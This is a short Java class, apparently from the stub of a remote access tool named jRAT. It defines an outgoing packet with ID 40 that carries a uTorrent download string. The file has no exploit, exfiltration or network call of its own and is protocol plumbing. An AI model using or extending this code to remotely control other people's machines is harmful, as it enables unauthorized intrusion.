package io.jrat.stub.packets.outgoing;

import io.jrat.common.io.StringWriter;

import java.io.DataOutputStream;


public class Packet40UTorrentDownload extends AbstractOutgoingPacket {

	private String torrent;

	public Packet40UTorrentDownload(String torrent) {
		this.torrent = torrent;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		sw.writeLine(torrent);
	}

	@Override
	public short getPacketId() {
		return 40;
	}

}
